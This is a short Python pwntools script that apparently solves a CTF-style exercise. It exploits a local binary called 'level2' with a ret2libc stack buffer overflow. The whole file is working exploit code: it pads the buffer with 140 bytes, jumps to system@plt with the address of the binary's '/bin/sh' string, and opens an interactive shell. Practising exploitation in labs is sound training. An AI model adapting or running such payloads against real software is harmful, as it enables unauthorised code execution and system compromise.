from pwn import *


def ret2_libc1_3(file_name='/mnt/hgfs/Cyber Security PWN/test/pwn2/level2'):
    elf = ELF(file_name)
    io = process([file_name])

    system_plt = p32(elf.plt['system'])
    bin_sh_str = p32(next(elf.search(b'/bin/sh')))

    payload = b'A' * 140

    payload += system_plt + b'A' * 4 + bin_sh_str

    io.sendline(payload)

    io.interactive()


if __name__ == '__main__':
    ret2_libc1_3()
